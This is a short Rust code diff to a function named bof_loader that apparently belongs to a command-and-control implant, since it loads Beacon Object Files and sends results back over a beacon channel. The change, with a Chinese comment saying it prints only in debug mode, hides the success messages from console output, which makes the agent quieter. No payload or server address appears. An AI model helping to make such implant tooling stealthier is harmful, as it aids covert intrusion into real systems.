@@ -180,7 +180,10 @@ pub fn bof_loader(mut decrypted_cursor: Cursor<Vec<u8>>) {
         println!("Failed to free memory");
     }
 
-    println!("Memory freed successfully");
+    // 仅在 debug 模式下打印
+    if cfg!(debug_assertions) {
+        println!("Memory freed successfully");
+    }
 
     let mut result;
     unsafe {
@@ -195,7 +198,8 @@ pub fn bof_loader(mut decrypted_cursor: Cursor<Vec<u8>>) {
     };
     unsafe {
         match beacon_send_result(&utf8_bytes, &BEACON, CALLBACK_OUTPUT) {
-            Ok(()) => println!("Beacon result sent successfully!"),
+            // Ok(()) => println!("Beacon result sent successfully!"),
+            Ok(()) => (),
             Err(e) => eprintln!("Failed to send beacon result: {}", e),
         }
     }
